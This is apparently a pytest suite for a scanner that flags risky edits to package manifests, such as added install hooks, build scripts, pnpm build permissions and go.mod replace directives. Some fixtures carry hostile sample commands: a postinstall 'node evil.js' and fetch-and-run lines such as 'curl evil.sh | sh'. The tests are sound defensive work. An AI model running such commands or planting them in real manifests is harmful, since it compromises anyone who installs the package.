"""Tests for the deterministic manifest scripts-key scan."""

import subprocess

import pytest

from manifest_risk import manifest_change_is_risky, manifest_script_changes


def _pkg(scripts: str = "", extra: str = "") -> str:
    scripts_part = f', "scripts": {{{scripts}}}' if scripts else ""
    return f'{{"name": "x", "version": "1.0.0"{scripts_part}{extra}}}'


@pytest.mark.parametrize(
    "path, base, head, risky",
    [
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest", "postinstall": "node evil.js"'),
            True,
            id="lifecycle-hook-added-inside-scripts",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest && curl evil.sh | sh"'),
            True,
            id="existing-script-command-edited",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest"').replace('"1.0.0"', '"1.0.1"'),
            False,
            id="version-bump-clean",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg(),
            _pkg(extra=', "pnpm": {"onlyBuiltDependencies": ["evil"]}'),
            True,
            id="pnpm-config-added",
        ),
        pytest.param(
            "pnpm-workspace.yaml",
            "onlyBuiltDependencies:\n  - esbuild\n",
            "onlyBuiltDependencies:\n  - esbuild\n  - evil\n",
            True,
            id="pnpm-workspace-built-dependency-added",
        ),
        pytest.param(
            "pnpm-workspace.yaml",
            "overrides:\n  react: 18.3.1\n",
            "overrides:\n  react: 18.3.2\n",
            True,
            id="pnpm-workspace-override-edited",
        ),
        pytest.param(
            "pnpm-workspace.yaml",
            "catalog:\n  react: 18.3.1\n",
            "catalog:\n  react: 18.3.2\n",
            False,
            id="pnpm-workspace-catalog-edit-clean",
        ),
        pytest.param(
            "pnpm-workspace.yaml",
            "packages:\n  - .\n",
            "packages:\n  - .\nallowBuilds:\n  esbuild: true\n",
            True,
            id="pnpm-workspace-build-authorization-added",
        ),
        pytest.param(
            "pnpm-workspace.yaml",
            "packages:\n  - .\n",
            "packages:\n  - .\ndangerouslyAllowAllBuilds: true\n",
            True,
            id="pnpm-workspace-all-builds-allowed",
        ),
        pytest.param(
            "pyproject.toml",
            "[project]\nname = 'x'\n",
            "[project]\nname = 'x'\n[project.scripts]\nx = 'pkg:main'\n",
            True,
            id="pyproject-scripts-added",
        ),
        pytest.param(
            "pyproject.toml",
            "[tool.poetry.scripts]\nx = 'a:main'\n",
            "[tool.poetry.scripts]\nx = 'b:main'\n",
            True,
            id="nested-tool-scripts-value-edited",
        ),
        pytest.param(
            "pyproject.toml",
            "[tool.ruff]\nline-length = 100\n",
            "[tool.ruff]\nline-length = 120\n",
            False,
            id="pyproject-tool-config-clean",
        ),
        pytest.param(
            "common/esbuilder/tsconfig.json",
            '{"compilerOptions": {"strict": true}}',
            '{"compilerOptions": {"strict": true}, "extends": "evil/tsconfig"}',
            True,
            id="tsconfig-extends-added",
        ),
        pytest.param(
            "common/esbuilder/tsconfig.json",
            '{"compilerOptions": {"strict": false}}',
            '{"compilerOptions": {"strict": true}}',
            False,
            id="tsconfig-option-clean",
        ),
        pytest.param("setup.py", "VERSION = '1.0'", "VERSION = '1.1'", True, id="setup-py-any-change"),
        pytest.param(
            "composer.json",
            '{"name": "x/x", "require": {"php": "^8.0"}}',
            '{"name": "x/x", "require": {"php": "^8.0"}, "scripts": {"post-install-cmd": "curl evil | sh"}}',
            True,
            id="composer-scripts-added",
        ),
        pytest.param(
            "composer.json",
            '{"name": "x/x", "version": "1.0.0"}',
            '{"name": "x/x", "version": "1.0.1"}',
            False,
            id="composer-version-bump-clean",
        ),
        pytest.param(
            "rust/Cargo.toml",
            '[dependencies]\nserde = "1.0"\n',
            '[dependencies]\nserde = "1.0.99"\n',
            True,
            id="cargo-dep-version-bump-fetches-in-unlocked-ci",
        ),
        pytest.param(
            "rust/Cargo.toml",
            "[features]\ndefault = []\n",
            '[features]\ndefault = ["optional-dep"]\n',
            True,
            id="cargo-feature-toggles-optional-dep",
        ),
        pytest.param(
            "rust/Cargo.toml",
            '[package]\nname = "x"\nversion = "1.0.0"\n',
            '[package]\nname = "x"\nversion = "1.0.1"\n',
            False,
            id="cargo-own-version-bump-clean",
        ),
        pytest.param(
            "rust/Cargo.toml",
            '[package]\nname = "x"\n',
            '[package]\nname = "x"\nbuild = "build.rs"\n',
            True,
            id="cargo-build-script-added",
        ),
        pytest.param("posthog/api/insight.py", "a", "b", False, id="non-manifest-never-risky"),
    ],
)
def test_manifest_change_is_risky_structural(path: str, base: str, head: str, risky: bool) -> None:
    # Both reviewer bots demonstrated the line-scan bypass: editing an
    # existing script's command diffs as a line keyed by the script's own
    # name, so only a structural compare of the risky subtrees catches it.
    # Over-matching matters too - version bumps hard-denying would undo the
    # manifest calibration entirely.
    assert manifest_change_is_risky(path, base, head) is risky


@pytest.mark.parametrize(
    "path, base, head",
    [
        pytest.param("frontend/package.json", _pkg(), "{not json", id="package-json"),
        pytest.param("pnpm-workspace.yaml", "packages:\n  - .\n", "packages: [", id="pnpm-workspace-yaml"),
        pytest.param("pyproject.toml", "[project]\nname = 'x'\n", "[project\nname = 'x'\n", id="pyproject-toml"),
        pytest.param("Pipfile", "[packages]\n", "[packages\n", id="pipfile"),
        pytest.param("rust/Cargo.toml", '[package]\nname = "x"\n', '[package\nname = "x"\n', id="cargo-toml"),
        pytest.param("composer.json", '{"name": "x/x"}', "{not json", id="composer-json"),
    ],
)
def test_manifest_change_is_risky_unparseable_fails_closed(path: str, base: str, head: str) -> None:
    # Each _STRUCTURAL_RISK_CHECKS entry has its own parse-failure exception
    # tuple; narrowing any one of them would fail open for that manifest
    # alone, so every format needs its own fail-closed case, not just json.
    assert manifest_change_is_risky(path, base, head) is True


_GO_MOD = "module example.com/app\n\ngo 1.22\n\nrequire example.com/lib v1.0.0\n"
_GO_MOD_BLOCK = _GO_MOD + "\nreplace (\n\texample.com/a => example.com/a v1.0.0\n)\n"


@pytest.mark.parametrize(
    "base, head, risky",
    [
        pytest.param(_GO_MOD, _GO_MOD + "replace example.com/x => ../local\n", True, id="replace-added"),
        pytest.param(_GO_MOD, _GO_MOD + "replace\texample.com/x => ../local\n", True, id="tab-separated-replace"),
        pytest.param(_GO_MOD, _GO_MOD.replace("v1.0.0", "v1.2.3"), False, id="require-bump-clean"),
        pytest.param(
            _GO_MOD_BLOCK,
            _GO_MOD_BLOCK.replace(")\n", "\texample.com/b => evil.example/b v1.0.0\n)\n"),
            True,
            id="entry-added-inside-existing-replace-block",
        ),
        pytest.param(_GO_MOD_BLOCK, _GO_MOD_BLOCK + "// a note\n", False, id="comment-only-clean"),
        pytest.param(
            _GO_MOD + "// note\vreplace example.com/x => ../local\n",
            _GO_MOD + "// note\nreplace example.com/x => ../local\n",
            True,
            id="replace-uncommented-by-a-vertical-tab-swap",
        ),
    ],
)
def test_go_mod_compares_replace_directives(base: str, head: str, risky: bool) -> None:
    assert manifest_change_is_risky("go.mod", base, head) is risky


_TSCONFIG = '{\n  // comment\n  "compilerOptions": {\n    "strict": true,\n  },\n}\n'


@pytest.mark.parametrize(
    "base, head, risky",
    [
        pytest.param(_TSCONFIG, _TSCONFIG.replace("// comment", "// edited"), False, id="comment-edit-clean"),
        pytest.param(_TSCONFIG, _TSCONFIG.replace('"strict": true', '"strict": false'), False, id="option-clean"),
        pytest.param(
            _TSCONFIG, _TSCONFIG.replace("{\n  //", '{\n  "extends": "evil",\n  //'), True, id="extends-added"
        ),
        pytest.param(
            '{\n  "compilerOptions": {\n    /* off\n    "plugins": [{"name": "evil"}],\n    */\n  },\n}\n',
            '{\n  "compilerOptions": {\n    /* off */\n    "plugins": [{"name": "evil"}],\n  },\n}\n',
            True,
            id="plugins-activated-by-moving-a-comment-terminator",
        ),
        pytest.param(
            '{"extends": "./base,}.json"}', '{"extends": "./base}.json"}', True, id="comma-inside-a-string-kept"
        ),
        pytest.param(_TSCONFIG, '{\n  "compilerOptions": {\n\v"plugins": []\n}}', True, id="unparseable-fails-closed"),
    ],
)
def test_tsconfig_compares_jsonc_structurally(base: str, head: str, risky: bool) -> None:
    assert manifest_change_is_risky("tsconfig.json", base, head) is risky


@pytest.mark.parametrize("given_merge_base", [False, True])
def test_wrapper_anchors_at_merge_base_not_base_tip(tmp_path, given_merge_base: bool) -> None:
    # Regression from review: comparing against the base branch *tip* counts
    # base-side drift (someone else's scripts change landing on the base) as
    # this PR's doing and falsely denies a clean manifest edit. The hosted
    # checkout is shallow, so a given merge base must be used without asking
    # git, which would fail there and deny every manifest.
    def run(*args: str) -> str:
        result = subprocess.run(["git", *args], capture_output=True, text=True, cwd=tmp_path, check=True)
        return result.stdout.strip()

    run("init", "-q", "-b", "main")
    run("config", "user.email", "t@t")
    run("config", "user.name", "t")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
    run("add", ".")
    run("commit", "-qm", "root")
    merge_base = run("rev-parse", "HEAD")

    run("checkout", "-qb", "feature")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.1"}')
    run("commit", "-qam", "version bump only")
    head = run("rev-parse", "HEAD")

    run("checkout", "-q", "main")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0", "scripts": {"evil": "x"}}')
    run("commit", "-qam", "base-side scripts change")
    base_tip = run("rev-parse", "HEAD")

    if given_merge_base:
        assert manifest_script_changes(["package.json"], "not-a-commit", head, tmp_path, merge_base) == []
    else:
        assert manifest_script_changes(["package.json"], base_tip, head, tmp_path) == []
